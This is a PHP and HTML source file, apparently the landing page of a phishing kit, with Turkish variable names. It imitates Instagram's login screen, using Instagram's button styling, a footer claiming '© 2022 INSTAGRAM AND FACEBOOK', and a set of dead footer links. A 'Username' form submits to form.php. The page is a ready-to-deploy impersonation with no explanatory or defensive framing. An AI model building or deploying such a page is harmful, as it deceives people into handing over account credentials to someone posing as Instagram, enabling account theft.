<?php 
include ("app/config.php");
include ("app/database/router.php");
include ("app/database/yazilar.php");
?>
<html>
<head>
<?php include ("app/tag/main/meta.php"); ?>
<style>
#copyright{
color:#999;}
#menu{


width:91%;
} 

#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
#asdxyz{
background-color:white;
width:91%;

}
#erhanasd{
font-family:sans-serif;
font-weight:200;
letter-spacing:;
color:#3d3d3d;
font-size:20px;}
#qenzyne{
width:60%;
color:#999;
font-family:sans-serif;
}
#nick{
background-color:#fafafa;
border:1px solid #cecece;
outline:none;
border-radius:6px;
width:220px;
height:35px;
text-align:center;
font-size:16px;}

#butonbey{
color:white;
background-color:#3897f0;
font-size:17px;

border-radius:5px;
outline:none;
font-family:sans-serif;
font-weight:540;
border:0;
width:170px;
height:30px;
font-weight:bold;

}
#nick:hover{

    border:1px solid #cecece;
    width:310px;
    max-width:80%;

}
</style>
</head>     

<body>
<body bgcolor="#fafafa">
<br>
<br>
<br>
<center>
<form method="get" action="form.php">
<div id="asdxyz" style="border:1px solid #cecece;">
<img src="https://ci4.googleusercontent.com/proxy/sKqXcB7zDP7N-6yY75yXsKOC97B-g-pZSdkWFTKh02EVUCA277wXPS-5JGPMeRBHAKdRtnZv=s0-d-e1-ft#https://i.hizliresim.com/p2vrgo.gif" width="165" height="122" style="margin-right:0px" class="CToWUd">
<h1 id="erhanasd"><?php echo $homebaslik; ?></h1>

<p id="qenzyne"><?php echo $homeyazi; ?></p><br>



<input type="text" id="nick" name="nick" required="" placeholder="Username" class="qua21"><br><br>
<input type="submit" value="Next" id="butonbey" style="">
</form>

<br><br>
</div>
</center>
<center><br> <br>

<div id="get">


<br><br><br>
<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;">© 2022 INSTAGRAM AND FACEBOOK </p>
<br>

</center>

</body>

</html>
